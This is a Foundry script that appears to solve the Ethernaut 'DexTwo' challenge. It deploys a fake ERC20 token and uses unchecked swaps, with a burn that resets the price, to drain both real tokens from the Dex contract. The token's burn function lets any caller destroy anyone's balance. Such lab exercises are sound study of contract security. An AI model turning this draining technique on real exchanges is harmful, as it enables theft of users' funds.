// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/DexTwo.sol";
import "forge-std/Script.sol";
import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract Token3 is ERC20 {
    DexTwo public dt_ = DexTwo(0x0e88F53DdCBCCF6375A81100d0Bec91876FC8e3c);

    constructor() ERC20("Token3", "TK3") {
        _mint(msg.sender, 2);
        _mint(address(dt_), 1);
    }

    function burn(address account, uint256 amount) public {
        _burn(account, amount);
    }
}

contract DexTwoSol is Script {
    DexTwo public dt_ = DexTwo(0x0e88F53DdCBCCF6375A81100d0Bec91876FC8e3c);

    function run() external {
        vm.startBroadcast();

        Token3 token3 = new Token3();

        IERC20(token3).approve(address(dt_), 2);
        dt_.swap(address(token3), dt_.token1(), 1);
        token3.burn(address(dt_), 1);
        dt_.swap(address(token3), dt_.token2(), 1);

        console.log("My token1 balance:", dt_.balanceOf(dt_.token1(), msg.sender));
        console.log("My token2 balance:", dt_.balanceOf(dt_.token2(), msg.sender));
        console.log("My token3 balance:", IERC20(token3).balanceOf(msg.sender));
        console.log("Dex's token1 balance:", dt_.balanceOf(dt_.token1(), address(dt_)));
        console.log("Dex's token2 balance:", dt_.balanceOf(dt_.token2(), address(dt_)));
        console.log("Dex's token3 balance:", IERC20(token3).balanceOf(address(dt_)));

        vm.stopBroadcast();
    }
}